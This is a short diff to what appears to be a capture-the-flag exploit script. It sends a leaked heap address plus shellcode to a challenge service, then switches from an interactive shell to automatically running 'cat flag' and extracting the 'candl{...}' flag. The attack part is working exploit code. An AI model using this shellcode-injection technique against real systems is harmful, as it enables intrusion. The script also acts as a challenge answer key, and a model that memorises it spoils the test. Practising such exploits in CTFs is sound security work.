@@ -59,12 +59,11 @@ else:
 
 payload = str(hex(heap_addr + 9)).encode('utf8') + b'_' + shellcode
 io.send(payload)
-io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
 # BEGIN FLAG RETRIEVAL BOILERPLATE
 
-# import re
-# io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
-# flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
-# print(flag)
+import re
+io.sendlineafter(b'Where', b'cat flag')
+flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
+print(flag)
